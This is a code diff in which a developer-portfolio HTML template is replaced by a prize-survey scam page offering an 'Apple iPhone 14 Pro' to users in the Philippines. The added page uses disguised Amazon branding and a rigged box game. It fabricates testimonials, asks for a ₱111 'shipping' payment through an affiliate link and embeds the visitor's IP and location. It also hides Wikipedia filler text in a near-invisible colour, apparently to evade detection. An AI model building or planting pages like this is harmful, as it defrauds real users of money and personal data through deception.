@@ -1,130 +1,303 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="css/uikit.css">
-    <link rel="stylesheet" href="css/styles.css">
-    <script src="js/uikit.js"></script>
-    <script src="js/uikit-icons.js"></script>
 
-    <title>Portfolio</title>
+<!DOCTYPE html>
+<html>
+<head><script>function requestLink(){return {sessionId:['sid','t8~pimm0jcrz2vk5rttawpyqft5']};}var geoInfo={"cc":"PH","cnames":{"de":"Philippinen","en":"Philippines","es":"Filipinas","fr":"Philippines","ja":"フィリピン共和国","pt-BR":"Filipinas","ru":"Филиппины","zh-CN":"菲律宾"},"city":{"de":"","en":"Quezon City","es":"","fr":"","ja":"","pt-BR":"","ru":"Кесон-Сити","zh-CN":""},"subdiv":{"de":"","en":"Metro Manila","es":"","fr":"","ja":"","pt-BR":"","ru":"","zh-CN":""},"pc":"1128","lat":14.6606,"long":121.0514};var ip='112.203.201.170';var devInfo='PLDT Fibre';</script>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="robots" content="noindex, follow">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="theme-color" content="#00529b">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js" type="text/javascript"></script>
+<link rel="stylesheet" href="/media/mainstream/all/ab/2008_2.css">
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/js/bootstrap.bundle.min.js"></script>
+<link rel="stylesheet" type="text/css" href="/media/mainstream/all/ab/2008.css">
+<script src="/media/mainstream/all/ab/2008_3.js"></script>
+<script src="/media/mainstream/icon.js"></script>
+<script src="/media/mainstream/sound.js"></script>
+<script type="text/javascript" src="/media/mainstream/u.js"></script>
+<script src="/media/mainstream/all/ab/2.js"></script>
+<script src="/media/mainstream/all/ab/2008_1.js"></script>
+<link rel="stylesheet" type="text/css" href="/media/mainstream/flag-icon/css/flag-icon.css">
+<title>Apple iPhone 14 Pro</title>
+
 </head>
 <body>
-<!-- Navigation Bar -->
-    <nav class="uk-navbar-container uk-margin-small-left uk-margin-small-right uk-visible@m uk-margin-xlarge-left uk-margin-xlarge-right" uk-navbar uk-sticky="sel-target: .uk-navbar-container; cls-active: uk-navbar-sticky">
-    
-    <div class="uk-navbar-left">
-        <a href="" class="uk-navbar-item uk-logo uk-light">JohnDoe.</a>
-    </div>
-    <div class="uk-navbar-right">
-
-        <ul class="uk-navbar-nav uk-light">
-            <li><a class="uk-button-text uk-text-capitalize" href="#about" uk-scroll>About</a></li>
-            <li><a class="uk-button-text uk-text-capitalize" href="#projects" uk-scroll>Projects</a></li>
-            <li><a class="uk-button-text uk-text-capitalize" href="mailto:" uk-scroll>Contact</a></li>
-
-        </ul>
-
-    </div>
-</nav>
-<!-- Navigation Bar Ends  -->
-
-<!-- Navigation Bar Mobile -->
-<nav class="uk-navbar-container uk-margin-small-left uk-margin-small-right uk-hidden@m uk-margin-xlarge-left uk-margin-xlarge-right" uk-navbar uk-sticky="sel-target: .uk-navbar-container; cls-active: uk-navbar-sticky">
-    
-    <div class="uk-navbar-left">
-        <a href="" class="uk-navbar-item uk-logo uk-light">JohnDoe.</a>
-    </div>
-    <div class="uk-navbar-right">
-
-        <ul class="uk-navbar-nav uk-light">
-            <li><button uk-toggle="target: #offcanvas-nav" type="button" uk-navbar-toggle-icon></button></li>
-
-        </ul>
-
-    </div>
-</nav>
-<!-- Change This -->
-<div id="offcanvas-nav" uk-offcanvas="overlay: true">
-    <div class="uk-offcanvas-bar uk-flex uk-flex-column">
-
-        <ul class="uk-nav uk-nav-primary uk-nav-center uk-margin-auto-vertical">
-            <li class="uk-active"><a href="#" uk-scroll>Home</a></li>
-            <li class="uk-active"><a href="#about" uk-scroll>About</a></li>
-            <li class="uk-active"><a href="#projects" uk-scroll>Projects</a></li>
-            <li class="uk-active"><a href="mailto:">Contact</a></li> <!--- change to ur email-->
-
-        </ul>
-
-
-
-
-    </div>
+<div id="p_body_content">
+  <canvas id="canvasConfetti" width="1440" height="667"></canvas>
+  <script type="text/javascript">
+        jQuery(document).ready(function () {
+            setTimeout(function () {
+                DeactivateConfetti();
+            }, 4000);
+        });
+    </script>
+  <script>
+    $('body').append(bgPresentbox)
+</script>
 </div>
 
-<!-- Navigation Bar Mobile Ends -->
-<!-- Home -->
-<section class="uk-margin-small-left uk-margin-small-right uk-margin-xlarge-top uk-margin-xlarge-bottom">
-    <h1 class="uk-margin-xlarge-left uk-light uk-text-left uk-margin-xlarge-right">I'm John Doe, a front-end web developer, <br>graphic designer, and an UI/UX designer.</h1>
-    <a href="#about" class="uk-margin-xlarge-left uk-text-capitalize uk-button uk-button-secondary" uk-scroll>About Me</a>
-
-
-</section>
-
-<!-- Home Ends -->
-<br>
-
-
-<hr class="uk-margin-xlarge-top uk-margin-xlarge-left uk-margin-xlarge-right">
-
-<!-- About Me -->
-<section id="about" class="uk-margin-small-left uk-margin-small-right uk-margin-xlarge-top uk-margin-xlarge-bottom">
-<h3 class="uk-margin-xlarge-left uk-light">About Me</h3>
-<!-- Change here to ur paragraph -->
-<p class="uk-margin-xlarge-left uk-margin-xlarge-right">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla eleifend posuere tortor vel lobortis. Morbi pretium in sapien non suscipit. Nam ac efficitur enim. Vestibulum accumsan erat sit amet nulla commodo, nec varius felis aliquam. Aliquam suscipit mauris lacus, at euismod purus tempor aliquam. Donec varius sem nisl. Fusce augue tortor, hendrerit at elit quis, aliquet blandit eros. Nam gravida sem velit, eu placerat nunc commodo ut. <br><br>Maecenas ultricies magna nec nisi egestas, in posuere velit tincidunt. Nam quis turpis non ligula dapibus bibendum sit amet at felis. Vestibulum ornare tempor nulla, quis sodales ex consequat vel. Morbi sollicitudin ligula eget mattis euismod. Nulla scelerisque malesuada arcu a vulputate. Phasellus ac lectus consequat, eleifend libero id, tincidunt lectus. Sed tempus gravida odio, sed semper neque aliquet imperdiet.</p>
-<a href="" class="uk-margin-xlarge-left uk-light uk-button-text" uk-icon="instagram"></a> &nbsp;<a href="" class="uk-light uk-button-text" uk-icon="dribbble"></a> &nbsp;<a href="" class="uk-button-text uk-light" uk-icon="github"></a> &nbsp;<a href="" class=" uk-light uk-button-text" uk-icon="linkedin"></a>
-
-<!-- About Me Ends -->
-
-
-
-
-</section>
-
-<!-- Projects Section -->
-<hr class="uk-margin-xlarge-left uk-margin-xlarge-right">
-<section id="projects" class="uk-margin-small-left uk-margin-small-right uk-margin-xlarge-top uk-margin-xlarge-bottom">
-<h3 class="uk-margin-xlarge-left uk-light">Projects</h3>
-<p class="uk-margin-xlarge-left">Projects that i've been working on</p>
-
-<div class="uk-margin-xlarge-left uk-margin-xlarge-right">
-    <!-- Change all of this to ur projects -->
-    <div class="uk-margin uk-card uk-card-secondary uk-card-body ">
-        <h4>Project Name</h4>
-        <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.</p>
-        <a class="uk-button-text uk-text-decoration-none" href="">
-            <span uk-icon="icon: link">
-            </span> Website Link </a>
+<div id="lotopop" class="css2008_4" style="display: none;"></div>
+<div id="id1" class="css2008_5">
+    <p style="text-align: center; line-height: 45px; font-size: 25px;"><img src="/media/mainstream/all/ab/l.png" id="main-logo">LOYALTY PROGRAM <span style="float:right;font-size: 35px;" class="userLocation squared geo-flag" data-city="0" data-cname="0" data-flag="1"></span></div></p>
+</div>
+<div class="css2008_6">
+  <div class="css2008_7 css2008_8" id="content1">
+    <h2 style="font-weight: bold;">Congratulations!</h2>
+    <p>Today, <span class="css2008_9">30</span>&nbsp;<span class="css2008_10">April</span> <span class="css2008_11">2023</span>, you have been randomly selected to take this survey. It will only take a minute and you will receive an amazing prize: <strong>Apple iPhone 14 Pro</strong>!</p>
+    <div class="css2008_12" style="max-width: 100%; margin: 0 auto;">
+      <div class="css2008_13"><img class="css2008_14" src="/media/mainstream/all/ab/muti_iphone14pro.png"> <img class="css2008_14 css2008_15" src="/media/mainstream/all/ab/muti_iphone14pro.png"></div>
+    </div>
+    <p>Like every <span class="css2008_16"></span>, we offer amazing prizes to 10 users. Today's prize is an Apple iPhone 14 Pro! Only 10 lucky users living in Philippines will be the winners!</p>
+    <p>This survey is conducted to improve the services provided to our users, and your participation will be 100% rewarded!</p>
+    <p>Hurry up, the prizes are limited!</p>
+    <div class="css2008_7 css2008_8" id="questions_all" data-total="4">
+      <div id="q1">
+        <p class="css2008_17"><strong>Questions 1/4:</strong>&nbsp;<span>Are you male or female?</span></p>
+        <div class="css2008_18 css2008_19 css2008_20" data-question="1" data-bq="1">Male</div>
+        <div class="css2008_18 css2008_19 css2008_20" data-question="1" data-bq="2">Female</div>
+      </div>
+      <div id="q2">
+        <p class="css2008_17"><strong>Questions 2/4:</strong>&nbsp;<span>How old are you?</span></p>
+        <div class="css2008_18 css2008_19 css2008_21" data-question="2" data-bq="1">18-29</div>
+        <div class="css2008_18 css2008_19 css2008_21" data-question="2" data-bq="2">30-39</div>
+        <div class="css2008_18 css2008_19 css2008_21" data-question="2" data-bq="3">40-49</div>
+        <div class="css2008_18 css2008_19 css2008_21" data-question="2" data-bq="4">50+</div>
+      </div>
+      <div id="q3">
+        <p class="css2008_17"><strong>Questions 3/4:</strong>&nbsp;<span>Do you often shopping on 𝖠𝗆𝖺𝗓𝗈𝗇?</span></p>
+       <div class="css2008_18 css2008_19 css2008_22" data-question="3" data-bq="1">Always</div>
+       <div class="css2008_18 css2008_19 css2008_22" data-question="3" data-bq="2">Sometimes</div>
+       <div class="css2008_18 css2008_19 css2008_22" data-question="3" data-bq="3">No</div>
+      </div>
+      <div id="q4">
+        <p class="css2008_17"><strong>Questions 4/4:</strong>&nbsp;<span>How do you rate 𝖠𝗆𝖺𝗓𝗈𝗇 services in Philippines?</span></p>
+        <div class="css2008_18 css2008_19 css2008_23" data-question="4" data-bq="1">Very satisfied</div>
+        <div class="css2008_18 css2008_19 css2008_23" data-question="4" data-bq="2">Satisfied</div>
+        <div class="css2008_18 css2008_19 css2008_23" data-question="4" data-bq="3">Dissatisfied</div>
+      </div>
+    </div>
+  </div>
+  <div class="css2008_7" id="content2">
+    <h2 style="text-align:center">We are verifying your answer...</h2>
+    <div class="d-flex justify-content-center">
+      <div class="spinner-border m-3" role="status"><span class="sr-only">Loading...</span></div>
+    </div>
+    <p class="css2008_24" id="result1">You have answered 4/4 questions!</p>
+    <p class="css2008_24" id="result2">Your IP address is valid for this promotion!</p>
+    <p class="css2008_24" id="result3">Gifts are available and reserved!</p>
+  </div>
+  <div class="css2008_7" id="content3">
+    <div id="boxes" class="css2008_25" data-cgeneric="boxes-cgeneric">
+      <div class="css2008_26"><img class="css2008_27" src="/media/mainstream/all/ab/iphone14pro.png" ></div>
+      <div id="0" class="css2008_32 css2008_33">
+        <div class="css2008_28"><img  src="/media/mainstream/all/ab/top_red.png"></div>
+        <div class="css2008_29"><img  src="/media/mainstream/all/ab/x1.png"> </div>
+        <div class="css2008_30 css2008_31"><img  src="/media/mainstream/all/ab/box-iphone14pro.png"> </div>
+        <div class="css2008_34"><img  src="/media/mainstream/all/ab/box_open.png"> </div>
+      </div>
+      <div id="1" class="css2008_32 css2008_33">
+        <div class="css2008_28"><img  src="/media/mainstream/all/ab/top_red.png"></div>
+        <div class="css2008_29"><img  src="/media/mainstream/all/ab/x1.png"> </div>
+        <div class="css2008_30 css2008_31"><img  src="/media/mainstream/all/ab/box-iphone14pro.png"> </div>
+        <div class="css2008_34"><img  src="/media/mainstream/all/ab/box_open.png"> </div>
+      </div>
+      <div id="2" class="css2008_32 css2008_33">
+        <div class="css2008_28"><img  src="/media/mainstream/all/ab/top_red.png"></div>
+        <div class="css2008_29"><img  src="/media/mainstream/all/ab/x1.png"> </div>
+        <div class="css2008_30 css2008_31"><img  src="/media/mainstream/all/ab/box-iphone14pro.png"> </div>
+        <div class="css2008_34"><img  src="/media/mainstream/all/ab/box_open.png"> </div>
+      </div>
+      <div id="3" class="css2008_32 css2008_33">
+        <div class="css2008_28"><img  src="/media/mainstream/all/ab/top_red.png"></div>
+        <div class="css2008_29"><img  src="/media/mainstream/all/ab/x1.png"> </div>
+        <div class="css2008_30 css2008_31"><img  src="/media/mainstream/all/ab/box-iphone14pro.png"> </div>
+        <div class="css2008_34"><img  src="/media/mainstream/all/ab/box_open.png"> </div>
+      </div>
+      <div id="4" class="css2008_32 css2008_33">
+        <div class="css2008_28"><img  src="/media/mainstream/all/ab/top_red.png"></div>
+        <div class="css2008_29"><img  src="/media/mainstream/all/ab/x1.png"> </div>
+        <div class="css2008_30 css2008_31"><img  src="/media/mainstream/all/ab/box-iphone14pro.png"> </div>
+        <div class="css2008_34"><img  src="/media/mainstream/all/ab/box_open.png"> </div>
+      </div>
+      <div id="5" class="css2008_32 css2008_33">
+        <div class="css2008_28"><img  src="/media/mainstream/all/ab/top_red.png"></div>
+        <div class="css2008_29"><img  src="/media/mainstream/all/ab/x1.png"> </div>
+        <div class="css2008_30 css2008_31"><img  src="/media/mainstream/all/ab/box-iphone14pro.png"> </div>
+        <div class="css2008_34"><img  src="/media/mainstream/all/ab/box_open.png"> </div>
+      </div>
+      <div id="6" class="css2008_32 css2008_33">
+        <div class="css2008_28"><img  src="/media/mainstream/all/ab/top_red.png"></div>
+        <div class="css2008_29"><img  src="/media/mainstream/all/ab/x1.png"> </div>
+        <div class="css2008_30 css2008_31"><img  src="/media/mainstream/all/ab/box-iphone14pro.png"> </div>
+        <div class="css2008_34"><img  src="/media/mainstream/all/ab/box_open.png"> </div>
+      </div>
+      <div id="7" class="css2008_32 css2008_33">
+        <div class="css2008_28"><img  src="/media/mainstream/all/ab/top_red.png"></div>
+        <div class="css2008_29"><img  src="/media/mainstream/all/ab/x1.png"> </div>
+        <div class="css2008_30 css2008_31"><img  src="/media/mainstream/all/ab/box-iphone14pro.png"> </div>
+        <div class="css2008_34"><img  src="/media/mainstream/all/ab/box_open.png"> </div>
+      </div>
+      <div id="8" class="css2008_32 css2008_33">
+        <div class="css2008_28"><img  src="/media/mainstream/all/ab/top_red.png"></div>
+        <div class="css2008_29"><img  src="/media/mainstream/all/ab/x1.png"> </div>
+        <div class="css2008_30 css2008_31"><img  src="/media/mainstream/all/ab/box-iphone14pro.png"> </div>
+        <div class="css2008_34"><img  src="/media/mainstream/all/ab/box_open.png"> </div>
+      </div>
+      <div id="9" class="css2008_32 css2008_33">
+        <div class="css2008_28"><img  src="/media/mainstream/all/ab/top_red.png"></div>
+        <div class="css2008_29"><img  src="/media/mainstream/all/ab/x1.png"> </div>
+        <div class="css2008_30 css2008_31"><img  src="/media/mainstream/all/ab/box-iphone14pro.png"> </div>
+        <div class="css2008_34"><img  src="/media/mainstream/all/ab/box_open.png"> </div>
+      </div>
+      <div id="10" class="css2008_32 css2008_33">
+        <div class="css2008_28"><img  src="/media/mainstream/all/ab/top_red.png"></div>
+        <div class="css2008_29"><img  src="/media/mainstream/all/ab/x1.png"> </div>
+        <div class="css2008_30 css2008_31"><img  src="/media/mainstream/all/ab/box-iphone14pro.png"> </div>
+        <div class="css2008_34"><img  src="/media/mainstream/all/ab/box_open.png"> </div>
+      </div>
+      <div id="11" class="css2008_32 css2008_33">
+        <div class="css2008_28"><img  src="/media/mainstream/all/ab/top_red.png"></div>
+        <div class="css2008_29"><img  src="/media/mainstream/all/ab/x1.png"> </div>
+        <div class="css2008_30 css2008_31"><img  src="/media/mainstream/all/ab/box-iphone14pro.png"> </div>
+        <div class="css2008_34"><img  src="/media/mainstream/all/ab/box_open.png"> </div>
+      </div>
+    </div>
+    <div id="p_modal1" class="modal fade text-center css2008_35" tabindex="-1" role="dialog" aria-hidden="true">
+      <div class="modal-dialog" role="document">
+        <div class="css2008_51">
+          <div class="css2008_50"><img class="css2008_36" src="/media/mainstream/all/ab/box_closed.png">
+            <h2>Congratulations, your answers have been successfully saved!</h2>
+            <p>Today, <span class="css2008_9">29</span>&nbsp;<span class="css2008_10">April</span>, you have a chance to win an Apple iPhone 14 Pro!<br>
+            <p>You must select the correct box with your prize inside.</p>
+            <p>You have 3 attempts. Good luck!</p>
+            <button type="button" id="p_modal_button1" class="css2008_39 css2008_40 css2008_41" style="background-color:#FF8F00; border-color:#FF8F00;">OK </button>
+          </div>
         </div>
-        <div class="uk-margin uk-card uk-card-secondary uk-card-body ">
-            <h4>Project Name</h4>
-            <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.</p>
-            <a class="uk-button-text uk-text-decoration-none" href="">
-                <span uk-icon="icon: link">
-                </span> Website Link </a>
-            </div></div>
-
-
-
-    <br>
-
-
-</section>
-<hr class="uk-margin-xlarge-left uk-margin-xlarge-right">
-</div>
-<!-- Projects Section Ends -->
+      </div>
+    </div>
+    <div id="p_modal2" class="modal fade text-center css2008_35" tabindex="-1" role="dialog" aria-hidden="true">
+      <div class="modal-dialog" role="document">
+        <div class="css2008_51">
+          <div class="css2008_50">
+            <div class="css2008_37">
+              <div class="css2008_38 draw"></div>
+            </div>
+            <h2>Oh...</h2>
+            <p>Sorry, the box you selected is empty. You still have (<span id="num_intentos">3</span>) chances! Good luck!</p>
+            <button type="button" id="p_modal_button2" class="css2008_39 css2008_40 css2008_41" style="background-color: #FF8F00; border-color: #FF8F00;">OK </button>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div id="p_modal3" class="modal fade text-center css2008_35" tabindex="-1" role="dialog" aria-hidden="true">
+      <div class="modal-dialog" role="document">
+        <div class="css2008_51">
+          <div class="css2008_50"><img src="/media/mainstream/all/ab/iphone14pro.png">
+            <h2>CONGRATULATIONS!</h2>
+            <h6>You have won an Apple iPhone 14 Pro!</h6>
+            <p>1. Click on "OK" to visit our sponsors page.</p>
+            <p>2. Enter your address and pay ₱111 shipping to get your iPhone 14 Pro.</p>
+            <p>3. Your Apple iPhone 14 Pro will be delivered within 3 to 5 days by the courier service.</p>
+            <a href="/web/" target="_blank"><button type="button" class="css2008_39 css2008_40 css2008_41" id="afflink"  style="background-color:#FF8F00; border-color:#FF8F00;">OK</button></a> </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="css2008_7" id="content4">
     
+     <div class="css2008_42">
+     <div class="css2008_43">
+        <p style="margin:0;padding:0;float:left;display:block;width:50%"><span style="color:#3b5998; cursor: pointer;">Comments</span> </p>
+        <p style="margin:0;padding:0;float:right;display:block;width:50%;color:#a8a7a7;text-align:right"> 7 of 589</p>
+        <div style="clear:both"></div>
+      </div>
+      <div class="css2008_43" id="comment0" style="display:block">
+        <div class="css2008_44"><img src="/media/mainstream/all/ab/my1.jpg"></div>
+        <div class="css2008_45">
+          <p class="css2008_46">Maleeka bin Amaani</p>
+          <p>Too bad, I've never won anything:(</p>
+        </div>
+        <div class="css2008_47"></div>
+        <div class="css2008_48"><span>I like it · Comment <img src="/media/mainstream/all/ab/like.png" width="15px" height="15px">3</span> · <u>4 minutes ago</u> </div>
+      </div>
+      <div class="css2008_43" id="comment1" style="display:block">
+        <div class="css2008_44"><img src="/media/mainstream/all/ab/my2.jpg"></div>
+        <div class="css2008_45">
+          <p class="css2008_46">Zumruda bin Zubaida</p>
+          <p>I thought it was a joke but I got my iPhone, I also told my friends how to get one!</p>
+        </div>
+        <div class="css2008_47"></div>
+        <div class="css2008_48"><span>I like it · Comment <img src="/media/mainstream/all/ab/like.png" width="15px" height="15px">17</span> · <u>38 minutes ago</u> </div>
+      </div>
+      <div class="css2008_43" id="comment2" style="display:block">
+        <div class="css2008_44"><img src="/media/mainstream/all/ab/my3.jpg"></div>
+        <div class="css2008_45">
+          <p class="css2008_46">Suria binti Hitam</p>
+          <p>I got a call to let me know I won, I'm so happy!</p>
+        </div>
+        <div class="css2008_47"></div>
+        <div class="css2008_48"><span>I like it · Comment <img src="/media/mainstream/all/ab/like.png" width="15px" height="15px">46</span> · <u>1 hours ago</u></div>
+      </div>
+      <div class="css2008_43" id="comment3" style="display:block">
+        <div class="css2008_44"><img src="/media/mainstream/all/ab/fr4.jpg"></div>
+        <div class="css2008_45">
+          <p class="css2008_46">Frank Miller</p>
+          <p>I thought it was a joke, but I got the prize this morning, I would like to do more surveys!</p>
+        </div>
+        <div class="css2008_47"></div>
+        <div class="css2008_48"><span>I like it · Comment <img src="/media/mainstream/all/ab/like.png" width="15px" height="15px">10</span> · <u>1 hours ago</u></div>
+      </div>
+      <div class="css2008_43" id="comment3" style="display:block">
+        <div class="css2008_44"><img src="/media/mainstream/all/ab/my5.jpg"></div>
+        <div class="css2008_45">
+          <p class="css2008_46">Kinaana binti Abdus Salam</p>
+          <p>Is it possible to get my iPhone today? Thank you</p>
+        </div>
+        <div class="css2008_47"></div>
+        <div class="css2008_48"><span>I like it · Comment <img src="/media/mainstream/all/ab/like.png" width="15px" height="15px">36</span> · <u>2 hours ago</u></div>
+      </div>
+      <div class="css2008_43" id="comment4" style="display:block">
+        <div class="css2008_44"><img src="/media/mainstream/all/ab/fr6.jpg"></div>
+        <div class="css2008_45">
+          <p class="css2008_46">Thomas Cook</p>
+          <p>Cool, I had never won anything!</p>
+        </div>
+        <div class="css2008_47"></div>
+        <div class="css2008_48"><span>I like it · Comment <img src="/media/mainstream/all/ab/like.png" width="15px" height="15px">31</span> · <u>3 hours ago</u></div>
+      </div>
+      <div class="css2008_43" id="comment5" style="display:block">
+        <div class="css2008_44"><img src="/media/mainstream/all/ab/my7.jpg"></div>
+        <div class="css2008_45">
+          <p class="css2008_46">Nirmala bin Suriani</p>
+          <p>I entered, won and received my iPhone 14 Pro in 5 days, thank you!</p>
+        </div>
+        <div class="css2008_47"></div>
+        <div class="css2008_48"><span>I like it · Comment <img src="/media/mainstream/all/ab/like.png" width="15px" height="15px">37</span> · <u>6 hours ago</u></div>
+      </div>
+    </div>
+    <style type="text/css">
+        .css2008_18, .text-primary {
+            background-color: #FF8F00};
+        }
+    </style>
+  </div>
+</div>
+
+<style>
+#footer a{
+color:#EFEFEF;}
+</style>
+<div id="footer" style="background-color:#0D141E; margin-bottom:0px;; font-size:12px; text-align:center; color:#EFEFEF;">
+
+  <p style="padding:20px; padding-bottom:0px;font-size: 13px;"><a  href="https://legacy.export.gov/article?id=Terms-of-Sale#">Terms of sale |</a> <a  href="https://www.cms.gov/CCIIO/Resources/Regulations-and-Guidance#">Conditions of participation in the Marketplace program |</a> <a  href="https://en.wikipedia.org/wiki/Personal_data#">Your personal information |</a> <a  href="https://en.wikipedia.org/wiki/Cookie#">Cookies |</a> <a  href="https://www.chubb.com/us-en/individuals-families/resources/6-ways-to-protect-your-personal-information-online.html#">Ads based on your interests</a></p>
+  <p style="color:#0D141F;">
+An island or isle is any piece of subcontinental land that is surrounded by water.[1] Very small islands such as emergent land features on atolls can be called islets, skerries, cays or keys. An island in a river or a lake island may be called an eyot or ait, and a small island off the coast may be called a holm. Sedimentary islands in the Ganges delta are called chars. A grouping of geographically or geologically related islands, such as the Philippines, is referred to as an archipelago.
+
+An island may be described as such, despite the presence of an artificial land bridge; examples are Singapore and its causeway, and the various Dutch delta islands, such as IJsselmonde. Some places may even retain "island" in their names for historical reasons after being connected to a larger landmass by a land bridge or landfill, such as Coney Island and Coronado Island, though these are, strictly speaking, tied islands. Conversely, when a piece of land is separated from the mainland by a man-made canal, for example the Peloponnese by the Corinth Canal, more or less the entirety of Fennoscandia by the White Sea Canal, or Marble Hill in northern Manhattan during the time between the building of the United States Ship Canal and the filling-in of the Harlem River which surrounded the area, it is generally not considered an island.
+
+There are two main types of islands in the sea: continental and oceanic. There are also artificial islands, which are man-made.
+</p>
+  
+</div>
 </body>
 </html>
